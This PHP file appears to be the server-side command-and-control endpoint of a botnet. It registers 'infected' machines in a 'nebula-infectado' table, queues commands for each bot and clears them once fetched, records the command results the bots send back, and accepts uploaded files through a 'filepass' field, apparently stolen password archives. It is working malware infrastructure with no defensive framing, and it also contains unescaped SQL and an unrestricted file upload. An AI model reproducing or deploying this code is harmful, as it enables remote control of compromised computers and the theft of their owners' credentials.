<?php 
$int = 0;
if ($int == 0) {
	$flow = "./";
}elseif ($int == 1) {
	$flow = "../";
}elseif ($int == 2) {
	$flow = "../../";
}elseif ($int == 3) {
	$flow = "../../../";
}elseif ($int == 4) {
	$flow = "../../../../";
}elseif ($int == 5) {
	$flow = "../../../../../";
}elseif ($int == 6) {
	$flow = "../../../../../../";
}
?>

<?php include($flow.'assents/app/connect.php');?>
<?php include($flow.'assents/app/XWnDaMdznuRJ9NaDU3GD/import_sec_stack.php'); ?>

<?php 


if (isset($_POST['register'])) {

	$Machine = input($_POST['Machine']);
	$Machine_name = input($_POST['NameMachine']);
	$MachineLocalIP = input($_POST['MachineIp']);
	$MachineIpRequest = Get_Ip();
	$MachinePath = input($_POST['Install']);
	$MachineHash = gen(16);

	$sql_infect = "SELECT * FROM `nebula-infectado` WHERE `Machine`='$Machine' && `MachineIpv4`='$MachineIpRequest' && `MachineIp`='$MachineLocalIP' && `MachineName`='$Machine_name'";
	$i = $connect->query($sql_infect)->num_rows;
	if ($i != 1) {
		$sql_cinfect = "INSERT INTO `nebula-infectado`(`Machine`, `MachineName`, `MachineIpv4`, `MachineIp`, `MachineInstall`, `MachineHash`, `MachineCommand`, `MachineResult`) VALUES ('$Machine','$Machine_name','$MachineIpRequest','$MachineLocalIP','$MachinePath','$MachineHash','','')";
		$connect->query($sql_cinfect);
	}

}

if (isset($_POST['GetCommand'])) {

	$Machine = input($_POST['Machine']);
	$Machine_name = input($_POST['NameMachine']);
	$MachineLocalIP = input($_POST['MachineIp']);
	$MachineIpRequest = Get_Ip();

	$sql_infect = "SELECT * FROM `nebula-infectado` WHERE `Machine`='$Machine' && `MachineIpv4`='$MachineIpRequest' && `MachineIp`='$MachineLocalIP' && `MachineName`='$Machine_name'";
	$i = $connect->query($sql_infect)->num_rows;
	if ($i == 1) {

		$consult_machine = $connect->query($sql_infect); $info_machine =
		$consult_machine->fetch_array(); 
		echo $info_machine['MachineCommand'];
		$sql_clear = "UPDATE `nebula-infectado` SET `MachineCommand`='' WHERE `Machine`='$Machine' && `MachineIpv4`='$MachineIpRequest' && `MachineIp`='$MachineLocalIP' && `MachineName`='$Machine_name'";
		$connect->query($sql_clear);

	}

}

if (isset($_POST['ResultCommand'])) {
	$Machine = input($_POST['Machine']);
	$Machine_name = input($_POST['NameMachine']);
	$MachineLocalIP = input($_POST['MachineIp']);
	$MachineIpRequest = Get_Ip();
	$ResultCMD = $_POST['ResultCommand'];

	$sql_infect = "SELECT * FROM `nebula-infectado` WHERE `Machine`='$Machine' && `MachineIpv4`='$MachineIpRequest' && `MachineIp`='$MachineLocalIP' && `MachineName`='$Machine_name'";
	$i = $connect->query($sql_infect)->num_rows;
	if ($i == 1) {

		$sql_result = "UPDATE `nebula-infectado` SET `MachineResult`='$ResultCMD' WHERE `Machine`='$Machine' && `MachineIpv4`='$MachineIpRequest' && `MachineIp`='$MachineLocalIP' && `MachineName`='$Machine_name'";
		$connect->query($sql_result);

	}
}


if (isset($_FILES["filepass"])) {
    $nomeArquivo = $_FILES["filepass"]["name"];
    $caminhoTemporario = $_FILES["filepass"]["tmp_name"];

    $destino = "zip/" . $nomeArquivo;
    move_uploaded_file($caminhoTemporario, $destino);
}

?>
